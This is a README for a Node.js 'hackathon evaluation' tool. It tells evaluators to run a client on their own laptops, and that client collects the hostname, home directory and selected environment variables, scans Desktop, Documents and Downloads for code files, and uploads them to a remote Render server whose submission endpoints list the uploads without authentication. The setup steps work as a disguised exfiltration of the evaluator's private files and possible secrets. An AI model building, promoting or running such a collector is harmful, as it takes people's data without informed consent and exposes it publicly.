# Thunder Hackathon 3.0

Thunder Hackathon 3.0 is a Node.js-based system information and code file collection tool built for hackathon evaluation workflows.

The project runs a local client on the evaluator laptop, collects basic machine details, scans common folders for code files, uploads the collected data to a cloud server, and stores each upload as a retrievable submission.

Cloud server:

```text
https://thunder-hackathon3.onrender.com
```

## What This Project Does

Thunder Hackathon 3.0 performs four main tasks:

1. Collects system information from the evaluator laptop.
2. Scans selected folders for code files.
3. Uploads the scanned data to the Render cloud server.
4. Stores submissions and allows them to be retrieved through API endpoints.

## Tech Stack

- Node.js
- Express.js
- JavaScript
- Render for cloud deployment
- JSON file storage for submissions

## Architecture Flow

```text
Evaluator Laptop
      ↓
Thunder Client (thunder.js)
      ↓
System Info + File Scanner
      ↓
Uploader (HTTP POST request)
      ↓
Render Cloud Server (Express API)
      ↓
Submission Storage (JSON files)
      ↓
Access via /submissions/:id API
```

## Project Structure

```text
thunder-hackathon-3.0/
├─ client/
│  ├─ thunder.js
│  ├─ systemInfo.js
│  ├─ scanner.js
│  └─ uploader.js
│
├─ server/
│  ├─ server.js
│  ├─ controller.js
│  └─ storage/
│
├─ package.json
├─ package-lock.json
└─ README.md
```

## Folder Explanation

### `client/`

The `client` folder contains the code that runs on the evaluator laptop.

It is responsible for collecting system information, scanning files, and uploading the final payload to the cloud server.

### `server/`

The `server` folder contains the Express.js backend.

It receives uploaded data, creates a unique submission ID, saves each submission as a JSON file, and exposes API routes to retrieve submission data.

### `server/storage/`

The `storage` folder stores uploaded submissions as JSON files.

Each submission is saved using its unique submission ID as the file name.

## File Responsibilities

### `client/thunder.js`

This is the main client entry point.

It controls the complete client-side flow:

1. Starts Thunder.
2. Collects system information.
3. Scans code files.
4. Uploads the payload to the cloud server.
5. Shows upload status in the terminal.

### `client/systemInfo.js`

This file collects system and runtime information, including:

- Operating system type
- Operating system release
- Operating system version
- CPU architecture
- Hostname
- Node.js version
- Platform details
- Home directory
- Selected environment variables

### `client/scanner.js`

This file scans common user folders for code files.

Default scanned folders:

- Desktop
- Documents
- Downloads

It filters files by supported code extensions only.

Supported file extensions:

```text
.js .py .java .cpp .c .ts .html .css .jsx
```

It also skips very large files to keep uploads manageable.

### `client/uploader.js`

This file sends the collected payload to the deployed Render server using an HTTP POST request.

Default upload endpoint:

```text
https://thunder-hackathon3.onrender.com/upload
```

### `server/server.js`

This file creates and starts the Express.js server.

It registers the API routes and listens on the configured port.

On Render, the port is provided automatically through the `PORT` environment variable.

### `server/controller.js`

This file contains the main server logic for:

- Receiving uploads
- Creating submission IDs
- Saving submissions
- Listing all submissions
- Returning one submission by ID

## Features

- Collect OS details
- Collect CPU architecture
- Collect hostname
- Collect Node.js version
- Collect platform information
- Collect home directory
- Collect selected environment variables
- Scan Desktop, Documents, and Downloads
- Filter code files only
- Upload scanned data to a cloud server
- Store submissions with unique IDs
- Retrieve submission data using API endpoints

## Setup Instructions for Evaluators

Follow these steps to run the Thunder client on your machine.

### 1. Download the Project ZIP

Open the GitHub repository and click:

```text
Code → Download ZIP
```

### 2. Extract the ZIP File

Extract the downloaded ZIP file to a folder on your computer.

Example:

```text
Downloads/thunder-hackathon-3.0
```

### 3. Open a Terminal

Open a terminal or command prompt in the extracted project folder.

On Windows, you can open the folder, click the address bar, type `cmd`, and press Enter.

### 4. Move Into the Project Directory

If your terminal is not already inside the project folder, use `cd`.

Example:

```bash
cd Hacathon_3-main
```

### 5. Install Dependencies

Run:

```bash
npm install
```

This installs the required Node.js packages.

### 6. Run the Thunder Client

Run:

```bash
node client/thunder.js
```

The client will collect system details, scan code files, and upload the submission to the cloud server.

## API Endpoints

Base URL:

```text
https://thunder-hackathon3.onrender.com
```

### `GET /health`

Checks whether the server is running.

Example:

```bash
curl https://thunder-hackathon3.onrender.com/health
```

Sample response:

```json
{
  "status": "ok",
  "service": "thunder-hackathon-server"
}
```

### `POST /upload`

Uploads system information and scanned code files to the server.

The client automatically uses this endpoint.

Endpoint:

```text
https://thunder-hackathon3.onrender.com/upload
```

Sample response:

```json
{
  "success": true,
  "id": "submission-1712345678901-a1b2c3",
  "timestamp": "2026-06-20T10:30:00.000Z",
  "fileCount": 12
}
```

### `GET /submissions`

Returns a list of all stored submissions.

Example:

```bash
curl https://thunder-hackathon3.onrender.com/submissions
```

Sample response:

```json
{
  "success": true,
  "submissions": [
    {
      "id": "submission-1712345678901-a1b2c3",
      "timestamp": "2026-06-20T10:30:00.000Z",
      "fileCount": 12
    }
  ]
}
```

### `GET /submissions/:id`

Returns full details for one submission.

Replace `:id` with the actual submission ID.

Example:

```bash
curl https://thunder-hackathon3.onrender.com/submissions/submission-1712345678901-a1b2c3
```

Sample response:

```json
{
  "success": true,
  "submission": {
    "id": "submission-1712345678901-a1b2c3",
    "timestamp": "2026-06-20T10:30:00.000Z",
    "systemInfo": {
      "hostname": "Evaluator-Laptop",
      "nodeVersion": "v18.20.0"
    },
    "files": []
  }
}
```

## Sample Terminal Output

When the evaluator runs the client, the terminal output may look like this:

```text
Starting Thunder...
Collecting system info...
Scanning files...
Uploading...
Upload complete.
{
  success: true,
  status: 201,
  data: {
    success: true,
    id: 'submission-1712345678901-a1b2c3',
    timestamp: '2026-06-20T10:30:00.000Z',
    fileCount: 12
  }
}
```

The important value is the submission ID:

```text
submission-1712345678901-a1b2c3
```

This ID can be used to retrieve the uploaded submission from:

```text
https://thunder-hackathon3.onrender.com/submissions/submission-1712345678901-a1b2c3
```

## Submission ID Format

Every upload receives a unique submission ID in this format:

```text
submission-{timestamp}-{randomString}
```

Example:

```text
submission-1712345678901-a1b2c3
```

Meaning:

- `submission` identifies the record as a Thunder submission.
- `{timestamp}` is generated using the current time in milliseconds.
- `{randomString}` is a short random value that helps avoid duplicate IDs.

## How It Works

1. The evaluator runs `node client/thunder.js`.
2. `thunder.js` starts the client workflow.
3. `systemInfo.js` collects basic system and Node.js runtime information.
4. `scanner.js` scans Desktop, Documents, and Downloads for supported code files.
5. `uploader.js` creates a JSON payload containing system information and scanned files.
6. The payload is sent to the Render cloud server using `POST /upload`.
7. The Express server receives the payload.
8. `controller.js` creates a unique submission ID.
9. The submission is saved as a JSON file inside `server/storage/`.
10. The evaluator or reviewer can access saved submissions using `/submissions` or `/submissions/:id`.

## Running the Server Locally

The project already points to the deployed Render server for evaluator usage.

If you want to run the backend locally for development, use:

```bash
npm run start:server
```

The local server will run at:

```text
http://localhost:5000
```

To run the client against a custom upload endpoint, set `THUNDER_SERVER_URL`.

Example:

```bash
THUNDER_SERVER_URL=http://localhost:5000/upload node client/thunder.js
```

On Windows PowerShell:

```powershell
$env:THUNDER_SERVER_URL="http://localhost:5000/upload"
node client/thunder.js
```

## Future Improvements

- CRUD operations on cloud data
- MongoDB integration
- Web dashboard UI
- Real-time monitoring
- Secure authentication system

## Summary

Thunder Hackathon 3.0 is a simple, practical Node.js tool for collecting evaluator system details and code files, uploading them to a Render-hosted Express API, and storing each upload as a uniquely identifiable submission.

It is designed to be easy to run, easy to inspect, and ready for hackathon evaluation.
